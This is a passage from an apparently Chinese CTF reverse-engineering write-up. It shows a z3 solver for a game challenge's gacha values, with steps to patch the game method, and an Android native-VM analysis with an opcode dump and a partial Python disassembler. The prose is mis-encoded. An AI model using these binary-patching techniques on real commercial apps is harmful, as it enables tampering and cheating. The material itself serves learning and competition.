-<span class="number">27</span> + bucket[<span class="number">14</span>] * <span class="number">91</span> + bucket[<span class="number">15</span>] * -<span class="number">76</span> == -<span class="number">1163</span> , bucket[<span class="number">0</span>] * <span class="number">64</span> + bucket[<span class="number">1</span>] * -<span class="number">50</span> + bucket[<span class="number">2</span>] * -<span class="number">23</span> + bucket[<span class="number">3</span>] * -<span class="number">70</span> + bucket[<span class="number">4</span>] * -<span class="number">78</span> + bucket[<span class="number">5</span>] * <span class="number">34</span> + bucket[<span class="number">6</span>] * <span class="number">26</span> + bucket[<span class="number">7</span>] * <span class="number">64</span> + bucket[<span class="number">8</span>] * -<span class="number">72</span> + bucket[<span class="number">9</span>] * <span class="number">10</span> + bucket[<span class="number">10</span>] * -<span class="number">96</span> + bucket[<span class="number">11</span>] * <span class="number">61</span> + bucket[<span class="number">12</span>] * -<span class="number">15</span> + bucket[<span class="number">13</span>] * <span class="number">31</span> + bucket[<span class="number">14</span>] * <span class="number">36</span> + bucket[<span class="number">15</span>] * <span class="number">50</span> == -<span class="number">266</span> , bucket[<span class="number">0</span>] * -<span class="number">27</span> + bucket[<span class="number">1</span>] * <span class="number">86</span> + bucket[<span class="number">2</span>] * -<span class="number">61</span> + bucket[<span class="number">3</span>] * <span class="number">89</span> + bucket[<span class="number">4</span>] * -<span class="number">53</span> + bucket[<span class="number">5</span>] * <span class="number">10</span> + bucket[<span class="number">6</span>] * -<span class="number">42</span> + bucket[<span class="number">7</span>] * <span class="number">92</span> + bucket[<span class="number">8</span>] * -<span class="number">48</span> + bucket[<span class="number">9</span>] * <span class="number">13</span> + bucket[<span class="number">10</span>] * <span class="number">84</span> + bucket[<span class="number">11</span>] * -<span class="number">71</span> + bucket[<span class="number">12</span>] * <span class="number">93</span> + bucket[<span class="number">13</span>] * <span class="number">54</span> + bucket[<span class="number">14</span>] * -<span class="number">69</span> + bucket[<span class="number">15</span>] * -<span class="number">30</span> == <span class="number">892</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;this.bucket[%d] = %s;&#x27;</span> % (i, m[bucket[i]]))</span><br><span class="line">       <span class="comment"># print(&#x27;%s,&#x27;% m[bucket[i]],end=&#x27;&#x27;)</span></span><br><span class="line"><span class="comment">#this.bucket[0] = 1;</span></span><br><span class="line"><span class="comment">#this.bucket[1] = 14;</span></span><br><span class="line"><span class="comment">#this.bucket[2] = 1;</span></span><br><span class="line"><span class="comment">#this.bucket[3] = 17;</span></span><br><span class="line"><span class="comment">#this.bucket[4] = 2;</span></span><br><span class="line"><span class="comment">#this.bucket[5] = 1;</span></span><br><span class="line"><span class="comment">#this.bucket[6] = 1;</span></span><br><span class="line"><span class="comment">#this.bucket[7] = 0;</span></span><br><span class="line"><span class="comment">#this.bucket[8] = 2;</span></span><br><span class="line"><span class="comment">#this.bucket[9] = 4;</span></span><br><span class="line"><span class="comment">#this.bucket[10] = 1;</span></span><br><span class="line"><span class="comment">#this.bucket[11] = 17;</span></span><br><span class="line"><span class="comment">#this.bucket[12] = 2;</span></span><br><span class="line"><span class="comment">#this.bucket[13] = 0;</span></span><br><span class="line"><span class="comment">#this.bucket[14] = 2;</span></span><br><span class="line"><span class="comment">#this.bucket[15] = 16;</span></span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆåœ¨int[] bucket = GachaManager.instance.gachaHistoryBucket.GetBucket();ä¸­ç›´æ¥å†™å…¥bucketçš„å€¼ï¼Œå³é”®-&gt;ç¼–è¾‘æ–¹æ³•-&gt;å†™å…¥ä¸Šé¢çš„å†…å®¹-&gt;ç¼–è¯‘-&gt;ä¸Šé¢å·¥å…·æ ä¿å­˜æ‰€æœ‰-&gt;æ‰“å¼€ä¸»ç¨‹åº-&gt;å‡ºé‡‘</p><p><img src="https://s2.loli.net/2024/02/16/q9Az37dHfU52bsl.png" alt="image-20240216121732007"></p><h3 id="EzADVM">EzADVM</h3><p>è¿™ä¸ªæ˜¯ä¸ªå®‰å“vmï¼Œjadxæ‰“å¼€ï¼Œç„¶åæ‰“å¼€main_activity,</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">CheckClick</span><span class="params">(View a)</span> &#123;</span><br><span class="line">        <span class="type">TextView</span> <span class="variable">tv</span> <span class="operator">=</span> <span class="built_in">this</span>.binding.sampleText;</span><br><span class="line">        <span class="type">EditText</span> <span class="variable">flagText</span> <span class="operator">=</span> <span class="built_in">this</span>.binding.flagtext;</span><br><span class="line">        <span class="type">String</span> <span class="variable">flagstring</span> <span class="operator">=</span> flagText.getText().toString();</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;Right!&quot;</span>.equals(stringFromJNI(flagstring))) &#123;</span><br><span class="line">            tv.setText(<span class="string">&quot;Right!&quot;</span>);</span><br><span class="line">            tv.setTextColor(-<span class="number">16711936</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>çœ‹åˆ°æœ‰stringFromJNI(flagstring)ï¼Œå»æ‰¾å‡½æ•°åŸå‹ï¼Œæ²¡æ‰¾åˆ°ï¼Œåº”è¯¥åœ¨åº“é‡Œã€‚</p><p>ç”¨apktoolåç¼–è¯‘å‡ºæºä»£ç ã€‚æ‰“å¼€soæ–‡ä»¶</p><p>é‡ç‚¹æ˜¯è¿™äº›ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">now_num = <span class="number">0</span>;</span><br><span class="line">  i = <span class="number">1</span>;</span><br><span class="line">  used_char = _JNIEnv::GetStringUTFChars(in, a3, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !i++ )</span><br><span class="line">      &#123;</span><br><span class="line">LABEL_29:</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">string</span>::basic_string&lt;decltype(nullptr)&gt;(v14, <span class="string">&quot;Error!&quot;</span>);</span><br><span class="line">        v7 = (<span class="type">const</span> <span class="type">char</span> *)sub_20F50(v14);</span><br><span class="line">        v13 = _JNIEnv::NewStringUTF(in, v7);</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(v14);</span><br><span class="line">        <span class="keyword">return</span> v13;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( code[i] != <span class="number">0x21</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      __strcpy_chk(input, used_char, <span class="number">1024LL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( code[i] == <span class="number">0xFF</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_29;</span><br><span class="line">    <span class="keyword">if</span> ( code[i] == <span class="number">0x88</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">switch</span> ( code[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xA1</span>u:</span><br><span class="line">        s[now_num - <span class="number">1</span>] = or_not_num &amp; or_num;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xC3</span>u:</span><br><span class="line">        or_num = b1 | b2;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xB2</span>u:</span><br><span class="line">        not_1 = ~b1;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xE5</span>u:</span><br><span class="line">        not_2 = ~b2;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xF1</span>u:</span><br><span class="line">        b1 = input[now_num];</span><br><span class="line">        b2 = input[++now_num];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xD4</span>u:</span><br><span class="line">        or_not_num = not_2 | not_1;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xBF</span>u:</span><br><span class="line">        i_form = now_num++;</span><br><span class="line">        save[<span class="number">0</span>] = s[i_form];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x99</span>u:</span><br><span class="line">        now_num = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xBB</span>u:</span><br><span class="line">        s[now_num - <span class="number">1</span>] = now_num + save[<span class="number">0</span>] - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(&amp;last, s, <span class="number">0x20</span>uLL) )</span><br></pre></td></tr></table></figure><p>è¾“å…¥ç”¨æ¥åˆå§‹åŒ–inputäº†ï¼Œæ‰€ä»¥ç›¸å½“äºæ˜¯ç”¨æŒ‡ä»¤ç å¯¹inputåŠ å¯†ï¼Œæœ€åå¾—åˆ°last</p><p>ä»¥åŠä¸€å¼€å§‹æœ‰ä¸€ä¸ªå¾ªç¯åªæœ‰å½“code[i]==0å…ˆ1æ—¶æ‰ä¼šæ‰§è¡Œåˆå§‹åŒ–ï¼Œæ‰€ä»¥åªéœ€è¦åŒ¹é…åˆç†çš„æŒ‡ä»¤å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">opcode = [<span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x21</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, </span><br><span class="line">        <span class="number">0xA1</span>, <span class="number">0x53</span>, <span class="number">0x57</span>, <span class="number">0x44</span>, <span class="number">0x61</span>, <span class="number">0x44</span>, <span class="number">0x64</span>, <span class="number">0xF1</span>, </span><br><span class="line">        <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, </span><br><span class="line">        <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, </span><br><span class="line">        <span class="number">0xA1</span>, <span class="number">0x53</span>, <span class="number">0x57</span>, <span class="number">0x44</span>, <span class="number">0x61</span>, <span class="number">0x44</span>, <span class="number">0x64</span>, <span class="number">0xF1</span>, </span><br><span class="line">        <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, </span><br><span class="line">        <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, </span><br><span class="line">        <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, </span><br><span class="line">        <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0x53</span>, <span class="number">0x57</span>, <span class="number">0x44</span>, </span><br><span class="line">        <span class="number">0x61</span>, <span class="number">0x44</span>, <span class="number">0x64</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, </span><br><span class="line">        <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, </span><br><span class="line">        <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0x53</span>, <span class="number">0x57</span>, <span class="number">0x44</span>, </span><br><span class="line">        <span class="number">0x61</span>, <span class="number">0x44</span>, <span class="number">0x64</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, </span><br><span class="line">        <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, </span><br><span class="line">        <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0x66</span>, <span class="number">0x6C</span>, <span class="number">0x61</span>, </span><br><span class="line">        <span class="number">0x67</span>, <span class="number">0x7B</span>, <span class="number">0x59</span>, <span class="number">0x75</span>, <span class="number">0x69</span>, <span class="number">0x73</span>, <span class="number">0x61</span>, <span class="number">0x62</span>, </span><br><span class="line">        <span class="number">0x65</span>, <span class="number">0x61</span>, <span class="number">0x75</span>, <span class="number">0x74</span>, <span class="number">0x69</span>, <span class="number">0x66</span>, <span class="number">0x75</span>, <span class="number">0x6C</span>, </span><br><span class="line">        <span class="number">0x67</span>, <span class="number">0x69</span>, <span class="number">0x72</span>, <span class="number">0x6C</span>, <span class="number">0x7D</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, </span><br><span class="line">        <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, </span><br><span class="line">        <span class="number">0xA1</span>, <span class="number">0x66</span>, <span class="number">0x6C</span>, <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x7B</span>, <span class="number">0x59</span>, <span class="number">0x75</span>, </span><br><span class="line">        <span class="number">0x69</span>, <span class="number">0x73</span>, <span class="number">0x61</span>, <span class="number">0x62</span>, <span class="number">0x65</span>, <span class="number">0x61</span>, <span class="number">0x75</span>, <span class="number">0x74</span>, </span><br><span class="line">        <span class="number">0x69</span>, <span class="number">0x66</span>, <span class="number">0x75</span>, <span class="number">0x6C</span>, <span class="number">0x67</span>, <span class="number">0x69</span>, <span class="number">0x72</span>, <span class="number">0x6C</span>, </span><br><span class="line">        <span class="number">0x7D</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, </span><br><span class="line">        <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0x66</span>, <span class="number">0x6C</span>, <span class="number">0x61</span>, </span><br><span class="line">        <span class="number">0x67</span>, <span class="number">0x7B</span>, <span class="number">0x59</span>, <span class="number">0x75</span>, <span class="number">0x69</span>, <span class="number">0x73</span>, <span class="number">0x61</span>, <span class="number">0x62</span>, </span><br><span class="line">        <span class="number">0x65</span>, <span class="number">0x61</span>, <span class="number">0x75</span>, <span class="number">0x74</span>, <span class="number">0x69</span>, <span class="number">0x66</span>, <span class="number">0x75</span>, <span class="number">0x6C</span>, </span><br><span class="line">        <span class="number">0x67</span>, <span class="number">0x69</span>, <span class="number">0x72</span>, <span class="number">0x6C</span>, <span class="number">0x7D</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, </span><br><span class="line">        <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, </span><br><span class="line">        <span class="number">0xA1</span>, <span class="number">0x53</span>, <span class="number">0x57</span>, <span class="number">0x44</span>, <span class="number">0x61</span>, <span class="number">0x44</span>, <span class="number">0x64</span>, <span class="number">0x66</span>, </span><br><span class="line">        <span class="number">0x6C</span>, <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x7B</span>, <span class="number">0x59</span>, <span class="number">0x75</span>, <span class="number">0x69</span>, <span class="number">0x73</span>, </span><br><span class="line">        <span class="number">0x61</span>, <span class="number">0x62</span>, <span class="number">0x65</span>, <span class="number">0x61</span>, <span class="number">0x75</span>, <span class="number">0x74</span>, <span class="number">0x69</span>, <span class="number">0x66</span>, </span><br><span class="line">        <span class="number">0x75</span>, <span class="number">0x6C</span>, <span class="number">0x67</span>, <span class="number">0x69</span>, <span class="number">0x72</span>, <span class="number">0x6C</span>, <span class="number">0x7D</span>, <span class="number">0xF1</span>, </span><br><span class="line">        <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, </span><br><span class="line">        <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, </span><br><span class="line">        <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0x53</span>, </span><br><span class="line">        <span class="number">0x57</span>, <span class="number">0x44</span>, <span class="number">0x61</span>, <span class="number">0x44</span>, <span class="number">0x64</span>, <span class="number">0x66</span>, <span class="number">0x6C</span>, <span class="number">0x61</span>, </span><br><span class="line">        <span class="number">0x67</span>, <span class="number">0x7B</span>, <span class="number">0x59</span>, <span class="number">0x75</span>, <span class="number">0x69</span>, <span class="number">0x73</span>, <span class="number">0x61</span>, <span class="number">0x62</span>, </span><br><span class="line">        <span class="number">0x65</span>, <span class="number">0x61</span>, <span class="number">0x75</span>, <span class="number">0x74</span>, <span class="number">0x69</span>, <span class="number">0x66</span>, <span class="number">0x75</span>, <span class="number">0x6C</span>, </span><br><span class="line">        <span class="number">0x67</span>, <span class="number">0x69</span>, <span class="number">0x72</span>, <span class="number">0x6C</span>, <span class="number">0x7D</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, </span><br><span class="line">        <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0x66</span>, <span class="number">0x6C</span>, <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x7B</span>, </span><br><span class="line">        <span class="number">0x59</span>, <span class="number">0x75</span>, <span class="number">0x69</span>, <span class="number">0x73</span>, <span class="number">0x61</span>, <span class="number">0x62</span>, <span class="number">0x65</span>, <span class="number">0x61</span>, </span><br><span class="line">        <span class="number">0x75</span>, <span class="number">0x74</span>, <span class="number">0x69</span>, <span class="number">0x66</span>, <span class="number">0x75</span>, <span class="number">0x6C</span>, <span class="number">0x67</span>, <span class="number">0x69</span>, </span><br><span class="line">        <span class="number">0x72</span>, <span class="number">0x6C</span>, <span class="number">0x7D</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, </span><br><span class="line">        <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, </span><br><span class="line">        <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, </span><br><span class="line">        <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, </span><br><span class="line">        <span class="number">0xA1</span>, <span class="number">0x53</span>, <span class="number">0x57</span>, <span class="number">0x44</span>, <span class="number">0x61</span>, <span class="number">0x44</span>, <span class="number">0x64</span>, <span class="number">0xF1</span>, </span><br><span class="line">        <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0x99</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, </span><br><span class="line">        <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, </span><br><span class="line">        <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, </span><br><span class="line">        <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, </span><br><span class="line">        <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, </span><br><span class="line">        <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0x66</span>, <span class="number">0x6C</span>, </span><br><span class="line">        <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x7B</span>, <span class="number">0x59</span>, <span class="number">0x75</span>, <span class="number">0x69</span>, <span class="number">0x73</span>, <span class="number">0x61</span>, </span><br><span class="line">        <span class="number">0x62</span>, <span class="number">0x65</span>, <span class="number">0x61</span>, <span class="number">0x75</span>, <span class="number">0x74</span>, <span class="number">0x69</span>, <span class="number">0x66</span>, <span class="number">0x75</span>, </span><br><span class="line">        <span class="number">0x6C</span>, <span class="number">0x67</span>, <span class="number">0x69</span>, <span class="number">0x72</span>, <span class="number">0x6C</span>, <span class="number">0x7D</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, </span><br><span class="line">        <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, </span><br><span class="line">        <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, </span><br><span class="line">        <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0x53</span>, <span class="number">0x57</span>, <span class="number">0x44</span>, <span class="number">0x44</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, </span><br><span class="line">        <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0x99</span>, <span class="number">0x53</span>, <span class="number">0x57</span>, <span class="number">0x44</span>, <span class="number">0x44</span>, <span class="number">0x53</span>, </span><br><span class="line">        <span class="number">0x57</span>, <span class="number">0x44</span>, <span class="number">0x44</span>, <span class="number">0x88</span>, <span class="number">0xFF</span>, <span class="number">0x53</span>, <span class="number">0x57</span>, <span class="number">0x44</span>, </span><br><span class="line">        <span class="number">0x44</span>, <span class="number">0x00</span>, <span class="number">0x00</span>]</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> code <span class="keyword">in</span> opcode:</span><br><span class="line">    <span class="keyword">match</span> code:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xa1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;last[now_num - 1] = or_not_num &amp; or_num&quot;</span> )</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xc3</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;or_num = b1 | b2&quot;</span>)</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xb2</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;not_1 = ~b1&quot;</span>)</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xe5</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;not_2 = ~b2&quot;</span>)</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xf1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;b1 = input[now_num]&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;now_num += 1&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;b2 = input[now_num]&quot;</span>)</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xd4</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;or_not_num = not_2 | not_1&quot;</span>)</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xbf</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;save = last[now_num]&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;now_num+=1&quot;</span>)</span><br><span class="line">        <span class="keyword">case</span> <span 